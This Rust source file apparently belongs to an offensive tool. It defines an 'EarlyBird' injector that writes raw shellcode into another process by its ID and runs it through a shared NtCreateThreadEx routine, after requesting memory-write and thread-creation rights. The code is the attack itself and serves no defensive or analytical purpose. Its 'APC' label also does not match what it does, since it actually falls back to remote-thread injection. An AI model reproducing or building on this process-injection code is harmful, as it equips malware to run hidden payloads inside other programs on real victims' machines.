use crate::injection::{payload_has_valid_pe_headers, Injector};
use anyhow::{anyhow, Result};

pub struct EarlyBirdInjector;

#[cfg(windows)]
impl Injector for EarlyBirdInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        // Early-bird APC path stages shellcode. PE payloads must use
        // Hollowing/ManualMap-style loaders instead.
        if payload_has_valid_pe_headers(payload) {
            return Err(anyhow!(
                "EarlyBird injection requires raw shellcode, not a PE image. \
                 Use InjectionMethod::Hollowing or InjectionMethod::ModuleStomp for PE payloads."
            ));
        }

        use winapi::um::winnt::{
            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
            PROCESS_VM_WRITE,
        };
        let access_mask =
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION;

        // Reuse the common NtCreateThreadEx pipeline until a dedicated APC-only
        // implementation is selected by configuration.
        crate::injection::nt_create_thread_inject(pid, payload, access_mask, "EarlyBird")
    }
}

#[cfg(not(windows))]
impl Injector for EarlyBirdInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!("EarlyBird injection only supported on Windows"))
    }
}
